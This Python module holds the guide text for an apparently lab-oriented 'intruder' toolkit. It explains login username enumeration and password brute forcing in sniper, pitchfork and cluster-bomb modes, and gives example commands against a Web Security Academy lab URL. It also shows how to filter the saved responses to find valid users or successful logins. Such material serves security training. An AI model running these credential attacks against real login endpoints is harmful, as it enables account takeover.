"""
guides.py
---------
Central place for the long-form user guides shown when a script is run with
--guide. Keeping all guide text here means every tool stays consistent and
the guides can be updated in one place.

Three things a user can reach:
  --help   : short, auto-generated flag reference (built into argparse)
  --guide  : full walkthrough with examples and the complete workflow
  (running with no arguments prints a friendly pointer to both)
"""

# A reusable banner so every guide looks consistent.
BANNER = r"""
  ______              _                 _   _             _
 |  ____|            | |               | | | |           | |
 | |__ __ _  ___ ___ | | ___  ___ ___  | |_| |_   _ _ __ | |_ ___ _ __
 |  __/ _` |/ __/ _ \| |/ _ \/ __/ __| |  _  | | | | '_ \| __/ _ \ '__|
 | | | (_| | (_|  __/| |  __/\__ \__ \ | | | | |_| | | | | ||  __/ |
 |_|  \__,_|\___\___||_|\___||___/___/ |_| |_|\__,_|_| |_|\__\___|_|
 
==============================================================
      PYTHON INTRUDER TOOLKIT  -  Authorised use only
==============================================================
   Author : Emmanuel Uwa  (alias: Faceless Hunter)
   Use    : Authorised security testing only
==============================================================
"""

CREDIT = "  Faceless Hunter  |  Emmanuel Uwa "
SNIPER_GUIDE = BANNER + r"""
SNIPER  -  Single-input login attack
----------------------------------------------------------

WHAT IT DOES
  Cycles ONE wordlist through ONE field while the other field stays fixed.
  Every response is saved to its own file for later analysis.

  Use it to:
    - enumerate usernames (fix the password, cycle the usernames)
    - brute-force a password (fix the username, cycle the passwords)

REQUIRED OPTIONS
  --url       The login endpoint, e.g. https://LAB.web-security-academy.net/login
  --mode      'username' or 'password'  (which field the wordlist targets)
  --wordlist  Path to the wordlist for the targeted field
  --fixed     The fixed value for the OTHER field
  --output    Folder to save the responses into

OPTIONAL
  --delay     Seconds to wait between requests (be polite / avoid rate limits)

EXAMPLE 1  -  Enumerate usernames
  python3 sniper.py \
    --url https://LAB.web-security-academy.net/login \
    --mode username \
    --wordlist wordlists/usernames.txt \
    --fixed anypassword \
    --output output/usernames

EXAMPLE 2  -  Brute-force the password of a known user
  python3 sniper.py \
    --url https://LAB.web-security-academy.net/login \
    --mode password \
    --wordlist wordlists/passwords.txt \
    --fixed administrator \
    --output output/passwords

NEXT STEP  -  Find the answer with the file searcher
  python3 file_searcher.py output/usernames \
    --negative "Invalid username or password"

  The one file that does NOT contain the failure message is your valid user.
==========================================================
"""

DOUBLE_GUIDE = BANNER + r"""
DOUBLE ATTACK  -  Pitchfork and Cluster Bomb
----------------------------------------------------------

WHAT IT DOES
  Uses TWO wordlists (usernames and passwords) and sends requests in one of
  two modes. Every response is saved to its own file.

  PITCHFORK    Pairs the two lists in lockstep:
               user[0]+pass[0], user[1]+pass[1], ...
               Requests = length of the SHORTER list.
               Use for KNOWN matched pairs (e.g. leaked user:pass combos).

  CLUSTERBOMB  Tries EVERY combination:
               each username against every password.
               Requests = usernames x passwords (grows fast!).
               Use when you do NOT know which password fits which user.

REQUIRED OPTIONS
  --url         The login endpoint
  --mode        'pitchfork' or 'clusterbomb'
  --usernames   Path to the usernames wordlist
  --passwords   Path to the passwords wordlist
  --output      Folder to save the responses into

OPTIONAL
  --delay       Seconds between requests

EXAMPLE  -  Cluster Bomb (full brute force)
  python3 double_attack.py \
    --url https://LAB.web-security-academy.net/login \
    --mode clusterbomb \
    --usernames wordlists/usernames.txt \
    --passwords wordlists/passwords.txt \
    --output output/clusterbomb

EXAMPLE  -  Pitchfork (matched pairs)
  python3 double_attack.py \
    --url https://LAB.web-security-academy.net/login \
    --mode pitchfork \
    --usernames wordlists/usernames.txt \
    --passwords wordlists/passwords.txt \
    --output output/pitchfork

NEXT STEP  -  Find the successful login
  python3 file_searcher.py output/clusterbomb --search "Welcome"
==========================================================
"""

SEARCHER_GUIDE = BANNER + r"""
FILE SEARCHER  -  Analyse a folder of saved responses
----------------------------------------------------------

WHAT IT DOES
  Searches every file in a directory and shows which files match your
  criteria. This is how you isolate the one response that matters.

FILTERS  (combine any of them; a file must pass ALL supplied filters)
  --search TERM     Show files that CONTAIN the term  (positive search)
  --negative TERM   Show files that do NOT contain the term (negative search)
  --status CODE     Show files whose response has this status code
  --min-size N      Show files of at least N bytes
  --max-size N      Show files of at most N bytes

EXAMPLE  -  Username enumeration (the classic use)
  python3 file_searcher.py output/usernames \
    --negative "Invalid username or password"
  -> the surviving file is your valid username.

EXAMPLE  -  Find a successful login
  python3 file_searcher.py output/clusterbomb --search "Welcome"

EXAMPLE  -  Combine filters
  python3 file_searcher.py output/usernames \
    --status 200 --negative "Invalid username"
==========================================================
"""


def print_guide(text):
    """Prints a guide block. Kept as a function so scripts call it cleanly."""
    print(text)
